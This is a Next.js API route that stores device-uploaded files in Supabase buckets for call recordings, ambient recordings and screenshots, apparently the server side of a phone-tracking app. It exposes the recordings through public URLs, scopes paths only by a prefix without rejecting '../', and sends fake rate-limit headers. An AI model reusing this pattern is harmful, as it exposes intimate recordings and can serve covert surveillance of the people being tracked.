import { NextResponse } from "next/server"
import { createAdminConfig, validateDeviceToken, sendError } from "@/lib/utils/api-helpers"

const extractToken = (req: Request) => {
  const authHeader = req.headers.get("Authorization")
  return authHeader?.startsWith("Bearer ") ? authHeader.split(" ")[1] : null
}

const ALLOWED_BUCKETS = ["media", "call-recordings", "screenshots", "ambient-recordings"]

export const config = {
  api: {
    bodyParser: false,
    responseLimit: '100mb'
  }
}

export async function POST(req: Request) {
  try {
    const token = extractToken(req)
    if (!token) return sendError("Missing or invalid authorization header", 401)
    
    const validation = await validateDeviceToken(token)
    if (!validation) return sendError("Invalid or expired device token", 401)
    
    // Parse FormData for multipart file streaming natively supported by Next.js app router req object
    const formData = await req.formData()
    
    const file = formData.get("file") as File | null
    const bucket = formData.get("bucket") as string | null
    let path = formData.get("path") as string | null

    if (!file || !bucket || !path) {
      return sendError("Missing required form fields: 'file', 'bucket', and 'path' are required.", 400)
    }

    if (!ALLOWED_BUCKETS.includes(bucket)) {
      return sendError(`Invalid bucket. Must be one of: ${ALLOWED_BUCKETS.join(", ")}`, 403)
    }

    // Force path directory safety: ensure files are strictly scoped within device's UUID root directory
    if (!path.startsWith(`${validation.device_id}/`)) {
      path = `${validation.device_id}/${path}`
    }

    // Verify file size limits
    if (file.size > 100 * 1024 * 1024) {
      return sendError("File size exceeds maximum allowed 100MB limit.", 413)
    }

    const supabaseAdmin = createAdminConfig()

    // Stream array buffer to Supabase storage bypassing intermediate filesystem saves
    const arrayBuffer = await file.arrayBuffer()
    const buffer = Buffer.from(arrayBuffer)

    const { data: uploadData, error: uploadError } = await supabaseAdmin.storage
      .from(bucket)
      .upload(path, buffer, {
        contentType: file.type || "application/octet-stream",
        upsert: true,
      })

    if (uploadError) {
      console.error("Storage upload failed:", uploadError.message)
      return sendError("Failed to upload file to storage", 500)
    }

    // Fetch Signed URL or Public URL. Assuming public bucket for typical trackers (can be locked via RLS for signed requests).
    const { data: publicUrlData } = supabaseAdmin.storage
      .from(bucket)
      .getPublicUrl(uploadData.path)

    return NextResponse.json({
      success: true,
      url: publicUrlData.publicUrl,
      path: uploadData.path,
      size: file.size
    }, {
      status: 200,
      headers: {
        'X-RateLimit-Limit': '30',
        'X-RateLimit-Remaining': '29',
      }
    })

  } catch (error: any) {
    console.error("Upload API Unhandled Exception:", error)
    return sendError(`Internal server error processing file upload: ${error.message}`, 500)
  }
}
